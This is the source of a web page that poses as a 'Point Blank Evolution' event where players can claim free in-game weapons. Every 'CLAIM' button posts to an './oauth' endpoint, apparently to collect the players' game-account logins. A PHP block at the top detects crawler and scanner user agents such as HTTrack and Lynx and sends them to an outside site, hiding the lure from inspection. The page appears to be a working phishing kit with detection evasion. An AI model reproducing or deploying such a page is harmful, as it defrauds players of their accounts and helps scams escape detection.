<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.anampedia.net');
die();
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="Point Blank Evolution">
    <meta name="description" content="Ikuti Eventnya Sekarang">
    <meta property="og:description" content="Ikuti Eventnya Sekarang">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="PB Evolution">
    <meta property="og:image" content="./assets/images/7.jpg">
    <meta property="og:type" content="website">
    <meta name="author" content="Idhaam69, rajaarn0@gmail.com">
    <meta name="copyright"content="Point Blank Evolution">
    <title>PB Evolution | Events</title>
    <link rel="stylesheet" type="text/css" media="screen" href="./assets/css/style.css" />
    <link rel="shorcut icon" href="./assets/images/favicon.ico">
</head>
<body>
    <div id="claim">
        <img class="img-claim" src="./assets/images/logo.png" alt="idhaam69" onclick="location.href='./claim.php';">
        <hr class="garis-claim">
        <div class="idhaam69">
            <div class="box-idhaam69">
                <p class="txt-box">Kriss S.V Phantom (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/7.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="7.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Kriss S.V Harimau (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/8.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="8.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Kriss S.V GSL2016 (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/9.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="9.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Pindad SS2 V5 G (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/4.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="4.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Pindad SS2 V5 PBNC (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/5.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="5.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">AUG A3 Phantom (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/6.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="6.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Caiman Grey (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/1.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="1.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Wolf (30 Hari)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/2.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="2.jpg">CLAIM</button>
                </form>
            </div>
            <div class="box-idhaam69">
                <p class="txt-box">Change Nickname (1 Unit)</p>
                <img class="img-box" alt="idhaam69" src="./assets/images/3.jpg"/>
                <form action="./oauth" method="POST">
                    <button class="btn-box" name="reward" value="3.jpg">CLAIM</button>
                </form>
            </div>
        </div>
    </div>
</body>
<script src="./assets/js/idhaam69.js"></script>
</html>